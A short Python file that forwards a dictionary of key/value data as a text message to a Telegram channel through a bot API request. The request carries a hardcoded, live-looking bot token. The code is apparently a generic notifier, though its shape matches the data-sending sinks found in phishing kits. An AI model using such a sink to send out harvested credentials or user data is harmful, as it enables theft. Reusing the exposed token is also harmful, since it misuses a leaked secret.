import requests

def send_datas(data):
    Telgm_Msg = "\n \n".join([f"{key.upper()}  :    {value}" for key, value in data.items()])

    def Send_Msg(message):
        Api_Tkn_Telgm = "5878376006:AAEP40y8TByHvfjY7fz0_8DNCT31w_6MTE0"
        Telgm_Grop_Id = "forgivenluv"
        Telgm_Url = f'https://api.telegram.org/bot{Api_Tkn_Telgm}/sendMessage?chat_id=@{Telgm_Grop_Id}&text={message}'
        Telgrm_respond = requests.get(Telgm_Url)

        if Telgrm_respond.status_code == 200:
            print('Your message was sent successfully')
        else:
            print('Your message was not sent successfully')

    Send_Msg(Telgm_Msg)